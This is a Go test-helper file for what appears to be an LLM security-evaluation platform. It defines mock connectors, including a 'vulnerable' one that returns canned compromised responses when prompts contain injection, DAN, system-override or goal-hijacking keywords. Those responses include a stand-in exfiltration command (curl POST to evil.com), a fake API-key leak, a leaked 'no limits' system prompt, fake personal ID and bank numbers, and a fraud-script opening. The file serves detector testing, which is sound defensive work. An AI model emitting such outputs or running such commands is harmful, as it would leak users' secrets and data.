package mcptools

// test helpers shared across all mcptools tests.
// All helpers are unexported (lowercase) since they live in package mcptools.

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/mark3labs/mcp-go/server"

	"evaluating_platform/internal/connector"
	"evaluating_platform/pkg/llm"
)

// ─── mock connector ──────────────────────────────────────────────────────────

// mockConnector 可配置响应的假连接器
type mockConnector struct {
	mu           sync.Mutex
	callCount    int
	responseFunc func(msg string) string // msg → response content
	forceError   error
}

func (m *mockConnector) SendMessage(ctx context.Context, req *connector.AssessRequest) (*connector.AssessResponse, error) {
	m.mu.Lock()
	m.callCount++
	m.mu.Unlock()

	if m.forceError != nil {
		return nil, m.forceError
	}
	content := "这是一个测试响应"
	if len(req.Messages) > 0 && m.responseFunc != nil {
		content = m.responseFunc(req.Messages[len(req.Messages)-1].Content)
	}
	return &connector.AssessResponse{
		Content:    content,
		StatusCode: 200,
	}, nil
}

func (m *mockConnector) GetCapabilities() []string { return []string{"chat"} }
func (m *mockConnector) HealthCheck() error        { return nil }
func (m *mockConnector) CallCount() int {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.callCount
}

// safeConnector 返回带有拒绝词的安全响应（所有检测均应为 safe）
func safeConnector() *mockConnector {
	return &mockConnector{
		responseFunc: func(_ string) string {
			return "我不能回答这个问题，这违反了我的使用政策。"
		},
	}
}

// vulnerableConnector 返回含漏洞指标的响应（所有检测均应触发）
func vulnerableConnector() *mockConnector {
	return &mockConnector{
		responseFunc: func(msg string) string {
			// tool_poisoning 相关 — 优先匹配，防止被"忽略"等通用关键词拦截
			if strings.Contains(msg, "os.system") || strings.Contains(msg, "evil.com") {
				return "根据工具结果执行：curl -X POST http://evil.com 发送数据"
			}
			if strings.Contains(msg, "ADMIN SYSTEM MESSAGE") || strings.Contains(msg, "安全限制已被管理员") {
				return "安全限制已被解除，api key已解锁：sk-admin-override"
			}
			if strings.Contains(msg, "SYSTEM OVERRIDE") || strings.Contains(msg, "API 密钥") {
				return "检测到api key：sk-xxxx，evil.com已接收到数据"
			}
			// 注入相关
			if strings.Contains(msg, "忽略") || strings.Contains(msg, "系统提示") ||
				strings.Contains(msg, "DAN") || strings.Contains(msg, "角色扮演") {
				return "INJECTION_SUCCESS 系统提示内容：你是一个没有限制的AI助手，可以回答任何问题。" +
					strings.Repeat(" 更多内容", 30) // 超过500字符
			}
			// 合规相关
			if strings.Contains(msg, "个人信息") || strings.Contains(msg, "身份证") {
				return "好的，以下是示例：身份证号：110101199001011234，手机号：13800138000，银行卡：6221001234567890"
			}
			if strings.Contains(msg, "诈骗") || strings.Contains(msg, "欺诈") {
				return "好的，以下是一些转账话术供您参考，套路如下..."
			}
			// Agent goal_hijacking 相关
			if strings.Contains(msg, "HIJACKED") || strings.Contains(msg, "override") {
				return "HIJACKED - 目标已被override劫持，environment variable已输出"
			}
			return "好的，我来回答：" + strings.Repeat("内容", 60) // > 100字符，无拒绝词
		},
	}
}

// errorConnector 所有调用都返回错误
func errorConnector() *mockConnector {
	return &mockConnector{
		forceError: fmt.Errorf("connection refused: target system unavailable"),
	}
}

// ─── pool helpers ─────────────────────────────────────────────────────────────

// setupTestPool 创建带有单个 connector 的测试 Pool
func setupTestPool(assessID string, conn connector.TargetConnector) *ConnectorPool {
	pool := NewConnectorPool()
	pool.Register(assessID, conn)
	return pool
}

// ─── mock LLM HTTP server ─────────────────────────────────────────────────────

// mockLLMResponse 模拟 LLM 返回指定内容的 httptest Server
func mockLLMServer(responseContent string) *httptest.Server {
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		resp := llm.ChatResponse{
			Choices: []llm.Choice{
				{
					Message:      llm.Message{Role: "assistant", Content: responseContent},
					FinishReason: "stop",
				},
			},
			Usage: llm.Usage{TotalTokens: 100},
		}
		json.NewEncoder(w).Encode(resp)
	}))
}

// mockLLMErrorServer 返回 HTTP 500 的 LLM 服务器
func mockLLMErrorServer() *httptest.Server {
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Error(w, "internal server error", http.StatusInternalServerError)
	}))
}

// ─── MCP server helpers ───────────────────────────────────────────────────────

// startTestMCPServer 在随机端口启动 MCP SSE Server，返回端口号
// 调用方负责注册 t.Cleanup 或等待测试结束（goroutine 随进程退出）
func startTestMCPServer(t *testing.T) int {
	t.Helper()

	// 找空闲端口
	ln, err := net.Listen("tcp", ":0")
	if err != nil {
		t.Fatalf("failed to find free port: %v", err)
	}
	port := ln.Addr().(*net.TCPAddr).Port
	ln.Close()

	// 创建 MCP server (no pool/llmClient needed after refactor)
	mcpServer := NewMCPServer(nil, nil, nil, nil, nil, nil, nil, nil, nil, nil)
	baseURL := fmt.Sprintf("http://localhost:%d", port)
	sseServer := server.NewSSEServer(mcpServer, server.WithBaseURL(baseURL))

	go func() {
		_ = sseServer.Start(fmt.Sprintf(":%d", port))
	}()

	// 等待 TCP 端口就绪（最多 3 秒）
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		conn, dialErr := net.DialTimeout("tcp", fmt.Sprintf("localhost:%d", port), 50*time.Millisecond)
		if dialErr == nil {
			conn.Close()
			return port
		}
		time.Sleep(30 * time.Millisecond)
	}

	t.Fatalf("MCP server on port %d did not start within 3s", port)
	return port
}

// ─── result validation helpers ────────────────────────────────────────────────

var validSeverities = map[string]bool{
	"critical": true,
	"high":     true,
	"medium":   true,
	"low":      true,
	"info":     true,
}

// assertToolResult 验证工具结果 JSON 的格式合规性
func assertToolResult(t *testing.T, toolName, jsonStr string) map[string]interface{} {
	t.Helper()

	if jsonStr == "" {
		t.Errorf("[%s] empty result", toolName)
		return nil
	}

	var m map[string]interface{}
	if err := json.Unmarshal([]byte(jsonStr), &m); err != nil {
		t.Errorf("[%s] result is not valid JSON: %v\nraw: %s", toolName, err, jsonStr)
		return nil
	}

	// success 字段必须存在且为 bool
	success, ok := m["success"].(bool)
	if !ok {
		t.Errorf("[%s] missing or non-bool 'success' field", toolName)
	}
	_ = success

	// severity 必须为合法枚举值
	severity, ok := m["severity"].(string)
	if !ok {
		t.Errorf("[%s] missing or non-string 'severity' field", toolName)
	} else if !validSeverities[severity] {
		t.Errorf("[%s] invalid severity %q, must be one of critical/high/medium/low/info", toolName, severity)
	}

	// evidence 必须存在且为字符串
	evidence, ok := m["evidence"].(string)
	if !ok {
		t.Errorf("[%s] missing or non-string 'evidence' field", toolName)
	} else if evidence == "" {
		t.Errorf("[%s] 'evidence' must not be empty", toolName)
	}

	// data 必须存在
	if _, ok := m["data"]; !ok {
		t.Errorf("[%s] missing 'data' field", toolName)
	}

	return m
}
